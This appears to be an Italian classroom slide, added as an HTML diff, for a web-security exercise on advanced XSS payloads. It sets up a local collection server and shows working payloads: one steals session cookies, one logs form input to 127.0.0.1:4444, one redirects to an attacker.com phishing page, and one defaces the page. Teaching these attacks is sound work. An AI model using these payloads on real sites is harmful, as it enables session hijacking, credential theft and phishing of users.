@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>OWASP A06:2021 - Esercizio 3: Payload XSS Avanzati</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="nav-buttons">
+        <div class="nav-btn" id="nav-menu"><svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div>
+        <div class="nav-btn" id="nav-prev"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></div>
+        <div class="nav-btn" id="nav-next"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">🎭 Esercizio 3: Payload XSS Avanzati</h1>
+        <div class="subtitle">Da alert() a data exfiltration</div>
+
+        <div class="card border-red" style="margin-bottom: 25px;">
+            <div class="card-title">🖥️ Setup: Server di Raccolta (Docente)</div>
+            <div class="card-text">
+                Prima dell'attacco, avvia un server HTTP per ricevere i dati esfiltrati:
+                <div class="code-box">python3 -m http.server 4444</div>
+                Questo server ascolterà su <span class="tech-term">http://127.0.0.1:4444</span> e mostrerà 
+                ogni richiesta ricevuta nel terminale.
+            </div>
+        </div>
+
+        <div class="grid-2-col">
+            <div class="card border-purple">
+                <div class="card-title">🍪 Furto di Cookie</div>
+                <div class="card-text">
+                    Ruba i cookie di sessione della vittima:
+                    <div class="code-box">&lt;img src=x onerror="
+  var img = new Image();
+  img.src = 'http://127.0.0.1:4444/steal?cookie=' 
+    + document.cookie;
+"&gt;</div>
+                    <br>
+                    <strong class="text-purple">Nel terminale vedrai:</strong>
+                    <div class="code-box">GET /steal?cookie=PHPSESSID=abc123...</div>
+                </div>
+            </div>
+
+            <div class="card border-blue">
+                <div class="card-title">⌨️ Form Logger</div>
+                <div class="card-text">
+                    Cattura tutti i dati inseriti nei form:
+                    <div class="code-box">&lt;img src=x onerror="
+document.querySelectorAll('input, textarea')
+  .forEach(function(el){
+    el.addEventListener('change', function(){
+      fetch('http://127.0.0.1:4444/?field='
+        + encodeURIComponent(el.name)
+        + '&amp;value=' + encodeURIComponent(el.value)
+      );
+    });
+  });
+"&gt;</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="grid-2-col" style="margin-top: 25px;">
+            <div class="card border-yellow">
+                <div class="card-title">🔀 Redirect Malevolo</div>
+                <div class="card-text">
+                    Reindirizza la vittima a un sito di phishing:
+                    <div class="code-box">&lt;img src=x onerror="
+  window.location='http://attacker.com/fake-login'
+"&gt;</div>
+                </div>
+            </div>
+
+            <div class="card border-green">
+                <div class="card-title">💥 Modifica DOM</div>
+                <div class="card-text">
+                    Defacement della pagina con jQuery:
+                    <div class="code-box">&lt;img src=x onerror="
+  $('body').html('&lt;h1&gt;HACKED!&lt;/h1&gt;');
+  $('body').css('background', 'red');
+"&gt;</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>const slideNumero = 5;</script>
+    <script src="main.js"></script>
+</body>
+</html>
+
